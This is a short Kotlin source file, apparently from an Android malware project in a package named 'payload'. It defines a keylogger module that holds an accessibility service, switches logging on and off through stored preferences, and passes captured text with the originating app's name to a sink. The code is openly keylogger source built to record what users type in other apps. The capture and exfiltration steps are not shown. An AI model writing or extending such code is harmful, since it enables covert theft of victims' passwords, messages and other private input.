package com.ihk909.payload.modules

import android.accessibilityservice.AccessibilityService
import android.content.Context
import com.ihk909.payload.util.Prefs

object KeyloggerModule {
    @Volatile var lastService: AccessibilityService? = null

    fun setEnabled(ctx: Context, on: Boolean) {
        Prefs.get(ctx).edit().putBoolean("keylog", on).apply()
    }

    fun enabled(ctx: Context): Boolean =
        Prefs.get(ctx).getBoolean("keylog", false)

    fun emit(text: String, pkg: String) {
        KeylogBus.sink?.on(text, pkg)
    }

    object KeylogBus {
        fun interface Sink { fun on(text: String, pkg: String) }
        @Volatile var sink: Sink? = null
    }
}